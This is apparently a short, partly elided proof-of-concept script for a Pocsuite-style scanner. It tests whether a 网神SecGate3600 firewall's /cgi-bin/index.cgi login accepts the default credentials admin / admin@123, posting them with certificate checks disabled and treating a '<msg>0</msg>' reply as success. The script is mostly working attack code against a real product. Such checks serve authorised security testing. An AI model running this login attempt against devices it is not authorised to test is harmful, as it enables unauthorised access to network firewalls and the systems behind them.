'''
Date: 2023-12-11 21:20:00
LastEditTime: 2023-12-11 21:23:11
FilePath: \网神SecGate\网神SecGate3600防火墙cgi-bin_index.cgi_默认口令.py
Description: 
...
class POC(POCBase):
    ...
    name = '网神SecGate3600防火墙/cgi-bin/index.cgi默认口令'  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = ''  # 漏洞应用名称
    appVersion = ''''''  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        网神SecGate3600防火墙/cgi-bin/index.cgi默认口令
    '''
  # 漏洞简要描述
    ...
    def _verify(self):
        ...
        data = 'type=loginCheck&user=admin&pwd=admin@123'
        try:
            resq = requests.post(url=self.url+path,headers=headers,data=data,timeout=10,verify=False)
            if  resq.status_code == 200 and '<msg>0</msg>' in resq.text:
                result['VerifyInfo'] = {}
